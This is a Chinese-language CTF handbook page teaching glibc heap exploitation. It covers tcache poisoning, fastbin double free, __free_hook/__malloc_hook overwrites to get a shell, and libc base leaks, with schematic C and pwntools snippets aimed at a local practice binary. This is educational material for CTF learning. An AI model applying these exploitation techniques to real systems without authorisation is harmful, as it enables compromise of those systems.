---
title: 堆利用基础
order: 8
icon: mdi:memory
category:
  - CTF
  - 手册
  - Pwn
---

堆漏洞是 Pwn 方向的进阶内容，难度高于栈溢出，但在 CTF 中出现频率很高。本节介绍 glibc 堆管理器的基础知识和最常见的攻击手法。

## 堆内存基础

堆是程序运行时动态分配的内存区域，通过 `malloc`/`free` 管理。

```c
void *p = malloc(0x20);   // 申请 0x20 字节
free(p);                   // 释放
```

### chunk 结构

glibc 把每块内存称为 chunk，结构如下：

```
+------------------+
| prev_size        |  8 字节（前一个 chunk 的大小，仅在前一个 free 时有效）
+------------------+
| size | flags     |  8 字节（本 chunk 大小 + 3 个标志位）
+------------------+  ← malloc 返回的指针指向这里
| user data        |
|                  |
+------------------+
```

`size` 字段的最低 3 位是标志位：
- `P`（bit 0）：前一个 chunk 是否在使用中
- `M`（bit 1）：是否由 mmap 分配
- `A`（bit 2）：是否属于非主 arena

### bins（空闲链表）

free 掉的 chunk 会被放入不同的 bin：

| bin 类型 | 大小范围 | 结构 |
|---------|---------|------|
| fastbin | ≤ 0x80 字节 | 单向链表，LIFO |
| tcache | ≤ 0x408 字节（glibc 2.26+） | 单向链表，每种大小最多 7 个 |
| unsorted bin | 任意大小 | 双向链表，临时存放 |
| small bin | < 0x400 字节 | 双向链表 |
| large bin | ≥ 0x400 字节 | 双向链表 |

## tcache 攻击（glibc 2.26+）

tcache 是 glibc 2.26 引入的线程缓存，安全检查很少，是现代 CTF 堆题的主要攻击目标。

### tcache poisoning（tcache 投毒）

**原理**：tcache 是单向链表，free 后 chunk 的 fd 指针指向下一个空闲 chunk。如果能修改 fd，就能让 malloc 返回任意地址。

```c
// 漏洞：UAF（Use After Free）
void *a = malloc(0x20);
void *b = malloc(0x20);
free(a);
free(b);
// tcache: b → a → NULL

// 修改 b 的 fd 指针（UAF 或堆溢出）
*(long *)b = target_addr;
// tcache: b → target_addr

malloc(0x20);  // 返回 b
malloc(0x20);  // 返回 target_addr！
```

**利用脚本框架**：

```python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

# 1. 申请并释放两个 chunk
alloc(0x20)   # chunk a
alloc(0x20)   # chunk b
free(0)       # free a
free(1)       # free b → tcache: b → a

# 2. 通过 UAF 修改 b 的 fd 为目标地址
write(1, p64(target_addr))

# 3. 两次 malloc，第二次得到 target_addr
alloc(0x20)   # 得到 b
alloc(0x20)   # 得到 target_addr

# 4. 向 target_addr 写数据（比如改 __free_hook 为 system）
write(2, p64(libc.symbols['system']))
```

## fastbin 攻击（glibc < 2.26）

fastbin 也是单向链表，但有大小检查（size 字段必须匹配）。

### fastbin dup（double free）

```c
void *a = malloc(0x20);
free(a);
free(a);  // double free！fastbin: a → a（循环）

malloc(0x20);  // 返回 a
// 修改 a 的 fd
*(long *)a = target_addr;
malloc(0x20);  // 返回 a
malloc(0x20);  // 返回 target_addr
```

## 常见利用目标

拿到任意地址写之后，通常改写这些位置来 getshell：

```python
# 方法1：改写 __free_hook 为 system
# 之后 free(chunk_containing_"/bin/sh") 就会调用 system("/bin/sh")
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

# 方法2：改写 __malloc_hook 为 one_gadget
# 之后任意 malloc 调用都会触发 one_gadget
malloc_hook = libc.symbols['__malloc_hook']
```

## 泄露 libc 基址

堆攻击通常需要先泄露 libc 地址：

```python
# 申请一个大 chunk（> 0x408），free 后进入 unsorted bin
# unsorted bin 的 fd/bk 指向 libc 内部的 main_arena
alloc(0x500)
alloc(0x20)   # 防止与 top chunk 合并
free(0)

# 读取 fd 指针，计算 libc 基址
leak = read_addr(0)
libc_base = leak - libc.symbols['main_arena'] - 96
```

## 调试工具

```bash
# pwndbg 堆调试命令
heap          # 查看所有 chunk
bins          # 查看所有 bin 的状态
vis_heap_chunks  # 可视化堆布局
```

## 练手资源

- CTFHub 堆利用技能树（从 tcache 开始）
- how2heap（GitHub）— 各种堆攻击的最小化示例
- 攻防世界 Pwn 中级题（heap 系列）
